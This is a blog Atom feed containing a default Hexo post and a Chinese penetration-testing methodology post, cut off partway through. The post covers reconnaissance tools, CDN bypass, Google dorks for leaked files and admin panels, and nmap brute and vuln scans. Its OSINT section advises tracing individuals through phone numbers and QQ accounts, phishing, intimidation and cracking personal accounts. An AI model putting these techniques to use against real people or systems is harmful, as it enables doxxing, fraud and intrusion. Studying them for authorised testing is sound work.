<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CCB</title>
  
  
  <link href="https://frankcao3.github.io/atom.xml" rel="self"/>
  
  <link href="https://frankcao3.github.io/"/>
  <updated>2023-10-05T11:40:46.695Z</updated>
  <id>https://frankcao3.github.io/</id>
  
  <author>
    <name>ccb</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="https://frankcao3.github.io/posts/16107"/>
    <id>https://frankcao3.github.io/posts/16107</id>
    <published>2023-10-05T11:40:46.695Z</published>
    <updated>2023-10-05T11:40:46.695Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>渗透测试全流程</title>
    <link href="https://frankcao3.github.io/posts/34953"/>
    <id>https://frankcao3.github.io/posts/34953</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T11:58:27.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试全流程"><a href="#渗透测试全流程" class="headerlink" title="渗透测试全流程"></a>渗透测试全流程</h1><p>参考：</p><p><a href="https://www.freebuf.com/articles/web/290055.html">https://www.freebuf.com/articles/web/290055.html</a></p><p><a href="https://www.freebuf.com/vuls/360173.html">https://www.freebuf.com/vuls/360173.html</a></p><p>从旁观者的角度了解整个WEB应用乃至整个目标的全貌，但是资产是收集不完的，可以边收集，边进行一定程度的测试。信息收集最小的粒度应是<strong>目录</strong>。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">dirbuster</span><br><span class="line">kali自带的一款工具，fuzz很方便</span><br><span class="line"></span><br><span class="line">gorailgun</span><br><span class="line">一款自动化做的非常好的工具，信息收集全过程都能用上</span><br><span class="line"></span><br><span class="line">OneForALL</span><br><span class="line">一款子域名收集工具，收集接口非常多，比自己收藏一大堆网址方便，收集子域自动去重，去无效，并进行拓展</span><br><span class="line"></span><br><span class="line">layer子域名挖掘机和subdomainbrute</span><br><span class="line">拉满线程去跑子域名的工具，都是老朋友见面，不用多说了</span><br><span class="line"></span><br><span class="line">一些信息收集的网站</span><br><span class="line">http://www.webscan.cc/                 C端同服扫描</span><br><span class="line">https://www.tianyancha.com/                 天眼查</span><br><span class="line">https://fofa.so/                   网络空间搜索引擎</span><br><span class="line">http://www.yunsee.cn/               云悉WEB资产搜集</span><br><span class="line">https://www.shodan.io/              shodan搜索引擎</span><br><span class="line">https://www.zoomeye.org/                知道创宇眼</span><br><span class="line">http://www.dianhua.cn/                     电话帮</span><br><span class="line">http://haoma.sogou.com/rz/              搜狗号码通</span><br><span class="line">http://haoma.baidu.com/query          百度号码认证</span><br><span class="line">http://www.gogoqq.com/          非好友情况如何查看QQ空间</span><br><span class="line">http://whitepages.com              房产登记信息查询</span><br><span class="line">http://tool.chinaz.com/                    站长之家</span><br><span class="line">http://www.webscan.cc/                     在线工具</span><br><span class="line">http://www.882667.com                 查询IP所在位置</span><br><span class="line">http://www.yunsee.cn         云悉在线WEB指纹CMS识别平台</span><br><span class="line">http://whatweb.bugscaner.com/look/         指纹识别</span><br><span class="line"></span><br><span class="line">临时邮箱</span><br><span class="line">https://temp-mail.org/zh/</span><br><span class="line">https://www.linshiyouxiang.net/</span><br><span class="line">https://www.guerrillamail.com/zh/</span><br><span class="line">https://www.moakt.com/zh</span><br><span class="line">http://links.icamtech.com/</span><br><span class="line"></span><br><span class="line">在线C段/同服(旁站)</span><br><span class="line">https://rapiddns.io/sameip</span><br><span class="line">http://www.webscan.cc/</span><br><span class="line">https://chapangzhan.com</span><br><span class="line">https://phpinfo.me/bing.php</span><br><span class="line"></span><br><span class="line">漏洞库</span><br><span class="line">https://www.cnvd.org.cn/</span><br><span class="line">https://www.securityfocus.com/</span><br><span class="line">https://packetstormsecurity.com/</span><br><span class="line">https://www.exploit-db.com/</span><br><span class="line">https://cxsecurity.com/</span><br><span class="line">https://shuimugan.com/</span><br><span class="line">http://0day.today/</span><br></pre></td></tr></table></figure><h3 id="1-目标确认"><a href="#1-目标确认" class="headerlink" title="1. 目标确认"></a>1. 目标确认</h3><h4 id="1-1-域名注册信息"><a href="#1-1-域名注册信息" class="headerlink" title="1.1 域名注册信息"></a>1.1 域名注册信息</h4><p><strong>通过如下步骤确认目标所有者信息：</strong></p><p>Whois 目标域名&#x2F;主机名：whois <a href="http://example.com/">http://example.com</a><br>解析目标域名&#x2F;主机名的IP地址：dig +short <a href="http://example.com/">http://example.com</a><br>获取域名的详细解析过程：dig +trace <a href="http://example.com/">http://example.com</a><br>后续用于字典制作和进一步收集目标信息的基础</p><p><strong>获取真实IP：</strong></p><p>浏览器切换手机模式，可能是真实ip，公众号、小程序中的资产也可能对应真实ip。</p><p><strong>验证是否存在CDN</strong></p><p>方法1：</p><p>使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p><p>方法2：</p><p>试用nslookup进行检测，如果返回域名解析对应多个IP，那么多半是试用了CDN.<br>nslookup <a href="http://example.com/">http://example.com</a></p><p>方法3:</p><p>在线工具查看是否存在CDN，可以参考以下站点:<br><a href="http://www.cdnplanet.com/tools/cdnfinder">http://www.cdnplanet.com/tools/cdnfinder</a><br><a href="http://www.ipip.net/ip.html">http://www.ipip.net/ip.html</a></p><p>&#x3D;&#x3D;<strong>绕过CDN查找网站真实IP</strong>&#x3D;&#x3D;</p><p><strong>1. 查询历史DNS记录(ip的历史解析域名，域名的历史解析ip)</strong></p><p>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a href="https://censys.io/ipv4?q=baidu.com">https://censys.io/ipv4?q=baidu.com</a><br>非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。<br><a href="http://viewdns.info/">http://viewdns.info</a></p><p>同样是个令站长十分蛋疼的DNS历史记录网站，记录了几年内的更改记录。<br><a href="http://securitytrails.com/">http://securitytrails.com</a><br><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p>庞大的DNS历史数据库，可以查出几年内网站用过的IP、机房信息等。<br><a href="http://iphostinfo.com/">http://iphostinfo.com</a><br>注意：这个网站可以遍历FTP、MX记录和常见二级域名，有些站长喜欢把邮箱服务也放在自己主机上，侧面泄露了真实的IP地址，通过这个网站可以进行检查。</p><p><strong>2. 查询子域名</strong>（捷径，去众测平台、github找官方发布过的）</p><p>注意：有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过子域名来辅助找到网站真实IP<br>爆破子域名:</p><p><strong>主动式</strong></p><p>layer子域名挖掘机（字典要自己丰富）<br><a href="http://z.zcjun.com/(%E5%9C%A8%E7%BA%BF%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98)">http://z.zcjun.com/(在线子域名挖掘)</a><br>fuzzdomain 很好用，速度快</p><p><strong>被动式</strong></p><p>搜索引擎拿<strong>子域名、旁站（同IP网站）、C段</strong>：</p><p>可用搜索引擎语法查询子域名：<br>谷歌、百度、bing、搜狗(搜索微信文章)、雅虎等略有差异</p><p>详细用法:<br>（1）site: &#x3D;主域名,搜索其主要域名下面的子域名<br>（2）allintext: &#x3D; 搜索文本,但不包括网页标题和链接<br>（3）allinlinks: &#x3D; 搜索链接, 不包括文本和标题。<br>（4）related:URL &#x3D; 列出于目标URL地址有关的网页。<br>（5）link:URL &#x3D; 列出到链接到目标URL的网页清单。<br>（6）使用“-”去掉不想看的结果，例如site:<a href="http://baidu.com/">http://baidu.com</a> <a href="http://-image.baidu.com/">http://-image.baidu.com</a></p><p>百度语法：<br><a href="https://www.cnblogs.com/k0xx/p/12794452.html">https://www.cnblogs.com/k0xx/p/12794452.html</a></p><p>谷歌语法：<a href="https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187</a></p><p>GHDB：<br><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p><p><strong>3. 资产搜索(旁站\C段\特征):</strong></p><p><a href="https://www.shodan.io(资产相关或特征值关键字爆ip)/">https://www.shodan.io(资产相关或特征值关键字爆ip)</a><br><a href="https://fofa.so/">https://fofa.so</a><br><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a> （云悉在线资产平台)<br><a href="http://subdomain.chaxun.la/">http://subdomain.chaxun.la</a> （查询啦）<br><a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a><br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a href="https://duckduckgo.com/">https://duckduckgo.com</a> （一个不会存储你个人信息的搜索引擎）<br><a href="https://crt.sh/%EF%BC%88SSL%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2%EF%BC%89">https://crt.sh/（SSL证书查询）</a><br><a href="https://icp.aizhan.com/(%E5%9F%9F%E5%90%8D%E5%A4%87%E6%A1%88)">https://icp.aizhan.com/(域名备案)</a></p><p><strong>4. 对方服务器给自己发邮件暴露IP</strong></p><p><strong>5. 使用其他地区的服务器ping网站，当地可能没做CDN</strong></p><p><strong>6. 借助漏洞</strong></p><p>若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。</p><h4 id="1-2-DNS信息查询"><a href="#1-2-DNS信息查询" class="headerlink" title="1.2 DNS信息查询"></a>1.2 DNS信息查询</h4><p><strong>目的:</strong></p><p>注册者名称及邮箱,再反查其他域名<br>手机号 座机号<br>ASN号</p><p>地址在线DNS信息查询工具<br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a href="https://www.dnsdb.io/">https://www.dnsdb.io</a> （DNS搜索引擎）<br><a href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com</a><br><a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a><br><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br><a href="https://whois.west.cn/">https://whois.west.cn/</a><br><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a> (站长之家)<br><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> （天眼查）<br><a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a> （国家企业信用信息系统）<br><a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a> （ICP备案查询）</p><h4 id="1-3-测试域传送漏洞"><a href="#1-3-测试域传送漏洞" class="headerlink" title="1.3 测试域传送漏洞"></a>1.3 测试域传送漏洞</h4><p>域传送是一种DNS事务，用于在主从服务器间复制DNS记录。虽然如今已经很少见主机会开启，但是还是应该确认一下。一旦存在域传送漏洞，就意味着你获取了整个域下面所有的记录。<br>dnsrecon -d <a href="http://example.com/">http://example.com</a><br>dnsenum <a href="http://example.com/">http://example.com</a> 包含自动检测域传送漏洞<br>dnsenum还能爆破子域名，功能比较多，详见：<br><a href="https://blog.csdn.net/weixin_43263851/article/details/108955964">https://blog.csdn.net/weixin_43263851/article/details/108955964</a></p><h4 id="1-4-业务相关"><a href="#1-4-业务相关" class="headerlink" title="1.4 业务相关"></a>1.4 业务相关</h4><p>github泄露：<br>in:name test #仓库标题搜索含有关键字 SpringCloud<br>in:descripton test #仓库描述搜索含有关键字<br>in:readme test #Readme文件搜素含有关键字<br>stars:&gt;3000 test #stars数量大于3000的搜索关键字<br>stars:1000..3000 test #stars数量大于1000小于3000的搜索关键字<br>forks:&gt;1000 test #forks数量大于1000的搜索关键字<br>forks:1000..3000 test #forks数量大于1000小于3000的搜索关键字<br>size:&gt;&#x3D;5000 test #指定仓库大于5000k(5M)的搜索关键字<br>pushed:&gt;2019-02-12 test #发布时间大于 2019-02-12的搜索关键字<br>created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字<br>user:test #用户名搜素<br>license:apache-2.0 test #明确仓库的 LICENSE 搜索关键字<br>language:java test #在java语言的代码中搜索关键字<br>user:test in:name test #组合搜索,用户名test的标题含有test的</p><p>网盘泄露：<br>各种云网盘，详见虫部落搜索:<br><a href="http://magnet.chongbuluo.com/">http://magnet.chongbuluo.com</a><br>敏感路径扫描：<br><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a></p><h3 id="2-OSINT-公开情报收集"><a href="#2-OSINT-公开情报收集" class="headerlink" title="2. OSINT 公开情报收集"></a>2. OSINT 公开情报收集</h3><h4 id="2-1-社工技巧"><a href="#2-1-社工技巧" class="headerlink" title="2.1 社工技巧"></a>2.1 社工技巧</h4><p><strong>查看注册的网站</strong>：0xreg reg007</p><p>知道账号去已注册的网站找回密码，可以看到打码后的用户名、邮箱、真实姓名等信息，如果运气好没准能从数据包或html中找到未被打码的信息</p><p><strong>可以从这些方面判断用户是否注册过</strong></p><p>找回密码：输入账号，如果进入下一步了则该账号存在</p><p>登录：输入账号和密码，如果提示密码错误，则表示该用户已存在</p><p>注册：填写账号时一般网站会去检测该账号是否已存在，如果已存在则会提示不可重复注册</p><p><strong>知道QQ</strong></p><p>通过QQ邮箱和QQ号搜索支付宝、淘宝账号等其他可能的常用平台<br>去腾讯\新浪微博搜索<br>通过微信搜索<br>查看QQ空间\相册\地区\星座\生日\昵称(后续构建字典以及跨平台搜集)<br>通过说说、留言、日志找到其好友<br>加QQ钓鱼\共同好友\可能认识的人</p><p><strong>知道手机号</strong></p><p>搜索QQ、微信、钉钉等社交账号<br>在比较火的一些APP和网站上注册或忘记密码来判断是否注册过账号<br>查询支付宝、QQ交易账号，尝试输入常见姓氏获取名字(转账到该手机号,会提示输入姓氏验证)<br>通过对方的职业、兴趣找到该领域知名度较高的社交网站反查<br>根据在QQ空间、朋友圈等动态用百度识图识别照片<br>在微博、ins、Twitter、fb、百度贴吧搜索相近关键字，按地域、年龄、男女、用户名等筛选</p><p><strong>留意社交动态</strong></p><p>发布时间线<br>使用什么客户端 iPhone Android还是浏览器<br>针对客户端预先制定exploit<br>注意每一条链接 &#x2F; 图片 &#x2F; 视频链接可能包含用户ID<br>图片可能包含水印，exif可能会有GPS定位和手机类型,图片内容特征<br>视频也有可能有水印暴露社交账号ID,拍摄地点<br>从最早发布的动态看起，会有很大收获<br>一般得到一个账号的密码就相当于得到了其他账号的密码<br>一般人不同账号的用户名都是相同或相近的<br>一般人的社交账号头像用的都是一样的<br>尝试破解社保、公积金账号、身份z号（出生地、生日、星座、派出所代码）</p><p>虫部落快搜之文件搜索:<a href="https://search.chongbuluo.com/">https://search.chongbuluo.com/</a></p><p>qq群、群文件、贴吧论坛、目标自用论坛等社交平台<strong>钓鱼</strong>和<strong>信息泄露</strong>(爬邮箱等信息)</p><p>电子邮件伪造、网络钓鱼<br>下载恶意程序<br>输入敏感信息</p><p>大部分信息可以用来生成密码字典</p><p>对人：说服对方达成一致、恐吓对方（敏感词、漏洞、病毒、权威机构名称、），钓鱼获取信息</p><h4 id="2-2-搜索引擎OSINT"><a href="#2-2-搜索引擎OSINT" class="headerlink" title="2.2 搜索引擎OSINT"></a>2.2 搜索引擎OSINT</h4><p><strong>Google Hacking</strong>(baidu\bing\souhu\github)</p><p>GoogleHacking常用语法</p><p>1、<strong>intext</strong>：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件<br>2、<strong>intitle</strong>： 把网页标题中的某个字符作为搜索的条件<br>3、<strong>cache</strong>： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息<br>4、<strong>filetype&#x2F;ext</strong>： 指定一个格式类型的文件作为搜索对象<br>5、<strong>inurl</strong>： 搜索包含指定字符的URL<br>6、<strong>site</strong>： 在指定的(域名)站点搜索相关内容　　</p><p>GoogleHacking其他语法</p><p>1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索<br>2、or 同时搜索两个或更多的关键字<br>3、link 搜索某个网站的链接 link:<a href="http://baidu.com即返回所有和baidu做了链接的url/">http://baidu.com即返回所有和baidu做了链接的URL</a><br>4、info 查找指定站点的一些基本信息　　GoogleHackingDatabase:<br>google-hacking-databaseGoogleHacking典型用法(<strong>特定资产的万能密码</strong>也要积累)</p><p>管理后台地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</span><br><span class="line">site:http://target.com inurl:login | inurl:admin | inurl:manage</span><br><span class="line">| inurl:manager | inurl:admin_login | inurl:system | inurl:backend</span><br><span class="line">site:http://target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</span><br></pre></td></tr></table></figure><p>上传类漏洞地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com inurl:file</span><br><span class="line">site:http://target.com inurl:upload</span><br></pre></td></tr></table></figure><p>注入页面：（批量注入工具、结合搜索引擎）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com inurl:php?id=</span><br></pre></td></tr></table></figure><p>编辑器页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com inurl:ewebeditor</span><br></pre></td></tr></table></figure><p>目录遍历漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intitle:index.of</span><br></pre></td></tr></table></figure><p>SQL错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:”Warning: pg_connect()&quot;</span><br></pre></td></tr></table></figure><p>phpinfo()：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br></pre></td></tr></table></figure><p>配置文件泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</span><br></pre></td></tr></table></figure><p>数据库文件泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.sql | .dbf | .mdb | .db</span><br></pre></td></tr></table></figure><p>日志文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.log</span><br></pre></td></tr></table></figure><p>备份和历史文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</span><br></pre></td></tr></table></figure><p>公开文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</span><br></pre></td></tr></table></figure><p>邮箱信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intext:@http://target.com</span><br><span class="line">site:http://target.com 邮件</span><br><span class="line">site:http://target.com email</span><br></pre></td></tr></table></figure><p>社工信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intitle:账号 | 密码 | 工号 | 学号 | 身份z</span><br></pre></td></tr></table></figure><h4 id="2-3-浏览器实用插件"><a href="#2-3-浏览器实用插件" class="headerlink" title="2.3 浏览器实用插件"></a>2.3 浏览器实用插件</h4><p>Wappalyzer：识别网站使用的中间件及其版本，再去漏洞库和搜索引擎找公开披露的漏洞</p><p>SwitchOmega：快捷切换代理</p><p>shodan：识别开放端口，主机服务等（被动信息搜集）</p><p>hacktools:综合插件,很强大</p><p>firefox渗透便携版version48,工具集成很多</p><p>注意：根据获得服务、中间件信息、编辑器版本、数据库等OSINT去各大漏洞库、搜索引擎找漏洞利用</p><h4 id="2-4-乌云和cnvd"><a href="#2-4-乌云和cnvd" class="headerlink" title="2.4 乌云和cnvd"></a>2.4 乌云和cnvd</h4><p>乌云库\乌云镜像\GHDB\CNVD等公开漏洞库</p><h3 id="3-x3D-x3D-打点-x3D-x3D"><a href="#3-x3D-x3D-打点-x3D-x3D" class="headerlink" title="3. &#x3D;&#x3D;打点&#x3D;&#x3D;"></a>3. &#x3D;&#x3D;打点&#x3D;&#x3D;</h3><p>打点方法</p><p>打点原理</p><h2 id="主动探测"><a href="#主动探测" class="headerlink" title="主动探测"></a>主动探测</h2><p>从管理员和用户的角度了解整个WEB应用乃至整个目标的全貌，主动探测会暴露ip以及留下日志信息，所以要…</p><h3 id="1-主动扫描"><a href="#1-主动扫描" class="headerlink" title="1. 主动扫描"></a>1. 主动扫描</h3><h4 id="1-1-常见服务漏洞（-x3D-x3D-nmap-x3D-x3D-）"><a href="#1-1-常见服务漏洞（-x3D-x3D-nmap-x3D-x3D-）" class="headerlink" title="1.1 常见服务漏洞（&#x3D;&#x3D;nmap&#x3D;&#x3D;）"></a>1.1 常见服务漏洞（&#x3D;&#x3D;nmap&#x3D;&#x3D;）</h4><p><strong>nmap</strong></p><p>功能包括脚本扫描，隐蔽扫描，端口扫描，服务识别，OS识别，探测WAF。</p><p>nmap脚本主要分为以下几类，在扫描时可根据需要设置</p><p>–script&#x3D;类别，这种方式进行比较笼统的扫描：</p><blockquote><p>auth: 负责处理鉴权证书（绕开鉴权）的脚本<br>broadcast: 在局域网内探查更多服务开启状况，如dhcp&#x2F;dns&#x2F;sqlserver等服务<br>brute: 提供暴力破解方式，针对常见的应用如http&#x2F;snmp等<br>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>dos: 用于进行拒绝服务攻击<br>exploit: 利用已知的漏洞入侵系统<br>external: 利用第三方的数据库或资源，例如进行whois解析<br>fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞<br>intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS&#x2F;IPS的记录或屏蔽<br>malware: 探测目标机是否感染了病毒、开启了后门等信息<br>safe: 此类与intrusive相反，属于安全性脚本<br>version: 负责增强服务与版本扫描（Version Detection）功能的脚本<br>vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=auth 192.168.137.*</span><br><span class="line">负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</span><br><span class="line"></span><br><span class="line">nmap -n -p445 --script=broadcast 192.168.137.4</span><br><span class="line">在局域网内探查更多服务开启状况</span><br><span class="line"></span><br><span class="line">nmap --script=brute 192.168.137.*</span><br><span class="line">提供暴力破解的方式 可对数据库，smb，snmp等进行简单密码的暴力猜解</span><br><span class="line"></span><br><span class="line">nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.*</span><br><span class="line">默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</span><br><span class="line"></span><br><span class="line">nmap --script=vuln 192.168.137.*</span><br><span class="line">检查是否存在常见漏洞</span><br><span class="line"></span><br><span class="line">nmap --script external 202.103.243.110</span><br><span class="line">利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line"></span><br><span class="line">nmap --script banner ip</span><br><span class="line">nmap -p port -sV ip</span><br><span class="line">获取软件版本信息</span><br><span class="line"></span><br><span class="line">nmap -O ip</span><br><span class="line">操作系统信息，版本</span><br><span class="line"></span><br><span class="line">nmap -A -v -sS -T2 ip</span><br><span 